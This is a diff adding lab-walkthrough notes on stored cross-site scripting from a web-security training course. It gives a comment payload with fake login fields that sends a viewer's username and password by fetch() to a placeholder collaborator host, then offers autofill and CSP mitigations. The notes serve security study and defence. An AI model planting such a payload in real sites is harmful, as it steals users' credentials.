@@ -496,3 +496,46 @@ This lab contains a [stored XSS](https://portswigger.net/web-security/cross-sit
 Without using Burp Collaborator - Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.
 
 ## **20. Exploiting cross-site scripting to capture passwords**
+This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
+1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
+2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+```
+   <input name=username id=username> 
+  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
+```
+This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
+
+4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
+5. Take a note of the value of the victim's username and password in the POST body.
+6. Use the credentials to log in as the victim user.
+
+If autofill is active and accessible via JavaScript, this poses a security risk. Attackers can exploit this by injecting malicious scripts (e.g., through an XSS vulnerability) to read and send the autofilled credentials to an external server.
+
+#### **Check the Input Field Attributes:**
+- Autofill relies on certain attributes in the input fields, such as `name`, `id`, and `autocomplete`.
+- The browser might use the `name` or `id` attribute to identify the fields. In this case, "username" and "password" are common names that browsers use to autofill.
+- Ensure these fields don’t have an `autocomplete="off"` or `autocomplete="new-password"` attribute, which would typically prevent autofill.
+    ```
+    <input name="username" id="username"> 
+    <input type="password" name="password">
+``
+
+- Since there's no `autocomplete` attribute set to "off," browsers may attempt to autofill these fields.
+
+**Mitigation**
+- Use the `autocomplete` attribute to guide browsers not to autofill sensitive fields:
+    
+    ```
+    <input name="username" id="username" autocomplete="off"> 
+    <input type="password" name="password" autocomplete="new-password">
+``
+
+- **Use Unique `name` and `id` Attributes:**
+	Avoid using common names like "username" and "password" for input fields that might prompt browsers to autofill.
+
+- **Use `SameSite` Cookies and `HttpOnly` Attributes:**
+	Protect session cookies with `SameSite` and `HttpOnly` attributes to minimize the impact of credential exfiltration.
+
+- **Content Security Policy (CSP):**
+	Implement a strict CSP to prevent inline JavaScript execution and unauthorized external requests.
